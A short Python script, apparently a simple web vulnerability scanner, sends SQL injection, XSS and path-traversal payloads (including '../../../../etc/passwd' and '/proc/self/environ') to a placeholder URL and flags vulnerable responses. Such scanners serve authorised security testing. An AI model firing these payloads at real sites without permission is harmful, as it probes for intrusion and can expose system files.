import requests
import re
import time
from typing import Dict, List
from concurrent.futures import ThreadPoolExecutor

url: str = "target_url_here"  # Replace with the actual target URL


payloads: Dict = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg><script>alert('XSS')</script></svg>"],
    "LFI": ["../../../../etc/passwd", "/etc/passwd", "/proc/self/environ", "/var/log/apache2/access.log"],
}

sqli_errors: List = [
    "sql syntax", "sqlite3::query():", "mysql server", "syntax error",
    "unclosed quotation mark", "near 'select'", "unknown column", "warning: mysql_fetch", "fatal error"
]

def scan_payloads(vuln_type, payload):
    try:
        response = requests.get(url, params={"id": payload}, timeout=5) # Adjust the parameter name as needed
        content = response.text.lower()

        if vuln_type == "SQLi" and any(error in content for error in sqli_errors):
            print(f"[SQLi] Vulnerable to SQL Injection with payload: {payload}")
            
        elif vuln_type == "XSS" and ("alert" in content or "xss" in content):
            print(f"[XSS] Potential XSS found with payload: {payload}")
            
        elif vuln_type == "LFI" and "root:x:" in content:
            print(f"[LFI] Vulnerable to Local File Inclusion with payload: {payload}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed during scan, please check the URL or network connection. ")

try:
    with ThreadPoolExecutor(max_workers=10) as executor:
        for vuln, tests in payloads.items():
            for payload in tests:
                executor.submit(scan_payloads, vuln, payload)
                time.sleep(0.5)

except KeyboardInterrupt:
    print("\n[!] Scan interrupted by user.")

except Exception as e:
    print(f"[!] An error occurred {e}")

finally:
    print("[*] Scan Stopped.")
